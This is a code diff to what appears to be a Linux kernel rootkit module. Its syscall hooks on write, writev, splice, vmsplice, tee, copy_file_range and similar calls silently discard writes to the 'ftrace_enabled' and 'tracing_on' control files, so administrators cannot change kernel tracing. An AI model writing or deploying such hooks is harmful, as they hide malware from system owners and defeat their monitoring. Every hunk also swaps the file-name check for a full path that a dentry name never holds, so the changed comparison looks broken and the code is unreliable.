@@ -65,7 +65,7 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
     if (file->f_path.dentry && file->f_path.dentry->d_name.name)
         name = file->f_path.dentry->d_name.name;
 
-    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
         fput(file);
 
         char *kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
@@ -136,7 +136,7 @@ static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *reg
     if (file->f_path.dentry && file->f_path.dentry->d_name.name)
         name = file->f_path.dentry->d_name.name;
 
-    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
         fput(file);
         return vlen;
     }
@@ -197,7 +197,7 @@ static notrace asmlinkage ssize_t hooked_fd_transfer_common(const struct pt_regs
     if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
         name = out_file->f_path.dentry->d_name.name;
 
-    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
         fput(out_file);
         return count;
     }
@@ -263,7 +263,7 @@ static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_
     if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
         name = out_file->f_path.dentry->d_name.name;
 
-    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
         fput(out_file);
         return count;
     }
@@ -309,7 +309,7 @@ static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *reg
     if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
         name = out_file->f_path.dentry->d_name.name;
 
-    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
         fput(out_file);
         return count;
     }
@@ -353,7 +353,7 @@ static notrace asmlinkage ssize_t hooked_vmsplice_common(const struct pt_regs *r
     if (file->f_path.dentry && file->f_path.dentry->d_name.name)
         name = file->f_path.dentry->d_name.name;
 
-    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
         fput(file);
         return nr_segs;
     }
@@ -399,7 +399,7 @@ static notrace asmlinkage ssize_t hooked_tee_common(const struct pt_regs *regs,
     if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
         name = out_file->f_path.dentry->d_name.name;
 
-    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
         fput(out_file);
         return count;
     }
@@ -453,7 +453,7 @@ static bool process_has_protected_fd(void)
             if (dentry && dentry->d_name.name)
                 name = dentry->d_name.name;
             
-            if (name && (strcmp(name, "ftrace_enabled") == 0 || 
+            if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || 
                        strcmp(name, "tracing_on") == 0)) {
                 has_protected = true;
                 break;
